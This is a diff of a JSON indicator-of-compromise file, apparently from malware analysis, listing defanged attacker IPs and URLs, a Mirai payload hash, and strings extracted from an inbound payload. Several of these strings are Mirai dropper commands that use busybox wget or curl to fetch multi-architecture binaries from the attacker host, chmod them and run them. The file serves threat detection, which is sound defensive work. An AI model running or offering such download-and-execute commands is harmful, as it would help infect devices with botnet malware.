@@ -1,35 +1,5 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "31.77.227.XXX"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://31.77.227.XXX/z0l"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6;"
-  },
-  {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
@@ -39,7 +9,7 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k;"
+    "value": "hxxp://31.77.227.XXX/z0l"
   },
   {
     "context": "Embedded URL in inbound payload",
@@ -57,7 +27,7 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc;"
+    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k;"
   },
   {
     "context": "Embedded URL in inbound payload",
@@ -69,7 +39,25 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
+    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
     "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86;"
   },
   {
     "context": "Embedded URL in inbound payload",
@@ -81,13 +69,19 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86;"
+    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc;"
   },
   {
-    "context": "Inbound payload hash (mirai)",
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6;"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "edde0ad3fbb7dfaa1b98875fc1bd479f2bb3efac70e2fd47c53829a797759906"
+    "type": "ip",
+    "value": "31.77.227.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
@@ -153,19 +147,13 @@
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
-    "value": "busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86"
-  },
-  {
-    "context": "Suspicious command in inbound payload",
-    "source": "strings",
-    "type": "command",
     "value": "busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ."
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
-    "value": "curl hxxp://31.77.227.XXX/z0l"
+    "value": "busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86"
   },
   {
     "context": "Suspicious command in inbound payload",
@@ -232,5 +220,17 @@
     "source": "strings",
     "type": "command",
     "value": "curl hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRi"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl hxxp://31.77.227.XXX/z0l"
+  },
+  {
+    "context": "Inbound payload hash (mirai)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "edde0ad3fbb7dfaa1b98875fc1bd479f2bb3efac70e2fd47c53829a797759906"
   }
 ]
